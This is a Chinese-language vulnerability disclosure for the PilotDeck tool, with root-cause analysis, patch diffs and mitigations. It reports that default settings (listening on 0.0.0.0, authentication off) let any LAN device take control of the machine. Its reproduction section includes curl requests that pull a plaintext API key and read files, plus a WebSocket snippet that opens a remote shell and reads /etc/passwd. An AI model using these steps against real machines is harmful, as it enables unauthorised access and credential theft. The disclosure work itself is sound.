# PilotDeck 安全漏洞报告

**报告日期：** 2026-05-28
**影响版本：** 当前 main 分支（所有版本）
**严重程度：** 🔴 严重（Critical）

---

## 一、漏洞概述

PilotDeck 存在两个设计缺陷，组合后导致同一局域网下的任何设备无需任何身份认证即可完全控制用户电脑。

| 缺陷 | 位置 | 说明 |
|------|------|------|
| 默认监听 `0.0.0.0` | `ui/server/index.js:2943` 等 3 处 | 服务暴露在所有网络接口，局域网可直接访问 |
| 默认关闭认证 | `ui/server/constants/config.js:15` | `DISABLE_LOCAL_AUTH` 默认为 `true`，跳过全部 JWT 验证 |

**一句话总结：** 用户启动 PilotDeck 后，同一 WiFi 下的任何人在浏览器输入 `http://<用户IP>:3001` 即可无密码访问全部 API，包括读写文件、窃取密钥、执行系统命令。

---

## 二、影响范围

### 谁会受影响

- 所有使用默认配置启动 PilotDeck 的用户
- 尤其是在公司办公网络、咖啡厅、酒店等共享 WiFi 环境下的用户

### 攻击者能做什么

| 危害等级 | 攻击行为 | 对应 API |
|---------|---------|---------|
| 🔴 远程代码执行 | 通过 WebSocket 获得完整系统终端 | `/shell` WebSocket |
| 🔴 文件读取 | 读取用户电脑上任意文件的完整内容 | `GET /api/projects/:name/file` |
| 🔴 文件写入/删除 | 覆写或递归删除用户文件 | `PUT /api/.../file`, `DELETE /api/.../files` |
| 🔴 密钥窃取 | 获取 AI Provider API Key 明文 | `GET /api/config/provider` |
| 🔴 项目打包下载 | 将整个项目目录打包为 ZIP 下载 | `GET /api/projects/:name/download` |
| 🟠 配置篡改 | 修改服务配置、权限设置 | `PUT /api/config`, `PUT /api/settings/permissions` |
| 🟠 聊天记录泄露 | 读取用户所有对话历史 | `GET /api/projects/:name/sessions` |
| 🟠 Git 仓库操控 | 提交、推送、删除分支 | `POST /api/git/push` 等 |
| 🟡 SSRF | 利用服务器向内网发起请求 | `POST /api/config/test-connection` |

---

## 三、复现步骤

### 环境

- 攻击者和受害者连接在同一局域网（如同一 WiFi）
- 受害者以默认配置启动 PilotDeck

### 步骤 1：确认服务暴露

攻击者在自己设备的浏览器中输入：

```
http://<受害者IP>:3001
```

无需登录，直接进入 PilotDeck Web UI。

### 步骤 2：窃取 API Key

```bash
curl http://<受害者IP>:3001/api/config/provider
```

返回结果（明文 API Key）：

```json
{
    "exists": true,
    "provider": {
        "type": "openai",
        "baseUrl": "https://api.deepseek.com/v1",
        "apiKey": "sk-xxxxxxxxxxxxxxxxxxxx",
        "model": "deepseek-v4-pro"
    }
}
```

### 步骤 3：读取任意文件内容

```bash
curl "http://<受害者IP>:3001/api/projects/<项目名>/file?filePath=pilotdeck.yaml"
```

返回文件完整内容。

### 步骤 4：获取远程终端

```javascript
const ws = new WebSocket("ws://<受害者IP>:3001/shell");
ws.onopen = () => ws.send(JSON.stringify({
  type: "init",
  projectPath: "/tmp",
  initialCommand: "whoami && cat /etc/passwd",
  isPlainShell: true
}));
ws.onmessage = (e) => console.log(e.data);
```

攻击者获得受害者系统的完整 shell 权限。

---

## 四、根本原因分析

### 缺陷 1：监听地址默认为 `0.0.0.0`

以下三处硬编码了 `0.0.0.0`：

```
ui/server/index.js:2943
  const HOST = process.env.HOST || '0.0.0.0';

ui/server/services/pilotdeckConfig.js:85
  host: '0.0.0.0',

ui/server/services/pilotdeckConfig.js:316
  HOST: process.env.HOST || String(runtime.host ?? '0.0.0.0'),

ui/server/cli.js:191
  const host = process.env.HOST || '0.0.0.0';
```

`0.0.0.0` 意味着接受来自所有网络接口的连接。对于本地桌面工具，应默认仅监听 `127.0.0.1`。

### 缺陷 2：认证默认关闭

```javascript
// ui/server/constants/config.js:15-17
export const DISABLE_LOCAL_AUTH =
  process.env.PILOTDECK_DISABLE_LOCAL_AUTH !== '0' &&
  process.env.PILOTDECK_DISABLE_LOCAL_AUTH !== 'false';
```

当环境变量 `PILOTDECK_DISABLE_LOCAL_AUTH` 未设置时，`undefined !== '0'` 为 `true`，导致认证被完全跳过。`authenticateToken` 中间件直接返回数据库中第一个用户，所有受保护的 API 变为完全开放。

### 两个缺陷的叠加效应

单独来看各有一定合理性（方便容器部署 / 降低使用门槛），但组合起来 = **全网络暴露 + 无认证 = 局域网内任何人完全控制用户电脑**。

---

## 五、建议修复方案

### 修复 1：默认监听地址改为 `127.0.0.1`（优先级：P0）

```diff
# ui/server/index.js:2943
- const HOST = process.env.HOST || '0.0.0.0';
+ const HOST = process.env.HOST || '127.0.0.1';

# ui/server/services/pilotdeckConfig.js:85
-         host: '0.0.0.0',
+         host: '127.0.0.1',

# ui/server/services/pilotdeckConfig.js:316
-     HOST: process.env.HOST || String(runtime.host ?? '0.0.0.0'),
+     HOST: process.env.HOST || String(runtime.host ?? '127.0.0.1'),

# ui/server/cli.js:191
-   const host = process.env.HOST || '0.0.0.0';
+   const host = process.env.HOST || '127.0.0.1';
```

### 修复 2：认证默认改为开启（优先级：P0）

```diff
# ui/server/constants/config.js:15-17
- export const DISABLE_LOCAL_AUTH =
-   process.env.PILOTDECK_DISABLE_LOCAL_AUTH !== '0' &&
-   process.env.PILOTDECK_DISABLE_LOCAL_AUTH !== 'false';
+ export const DISABLE_LOCAL_AUTH =
+   process.env.PILOTDECK_DISABLE_LOCAL_AUTH === '1' ||
+   process.env.PILOTDECK_DISABLE_LOCAL_AUTH === 'true';
```

### 修复 3：其他关联安全问题（优先级：P1）

| 问题 | 文件 | 建议 |
|------|------|------|
| `/api/config/provider` 返回明文 API Key | `routes/config.js:163` | 对 `apiKey` 字段做脱敏处理 |
| GitHub token 嵌入 clone URL 泄露到日志 | `routes/projects.js:548` | 使用 `GIT_ASKPASS` 或 header auth |
| API Key 可通过 query param 传递 | `routes/agent.js:44` | 仅允许 header 传递 |
| `_safeFilePath` 路径遍历防护不完整 | `sessionManager.js:141` | 改用递归替换或白名单校验 |
| `validateFilePath` 缺少 projectPath 参数 | `routes/git.js:251` | 传入 projectPath 启用路径遍历检查 |
| `/load` 路由路径检查可绕过 | `routes/commands.js:884` | 改用 `path.relative` 前缀检查 |
| SQLite 事务内使用 await | `routes/auth.js:48` | 将 bcrypt.hash 移到事务外部 |

---

## 六、临时缓解措施（用户可立即执行）

在官方修复发布前，用户可通过以下方式自我保护：

```bash
# 方法 1：设置环境变量启动
HOST=127.0.0.1 PILOTDECK_DISABLE_LOCAL_AUTH=0 pilotdeck

# 方法 2：开启 macOS 防火墙
# 系统偏好设置 → 网络 → 防火墙 → 打开
```

---

*本报告由安全审计生成，建议以 P0 优先级修复缺陷 1 和缺陷 2。*
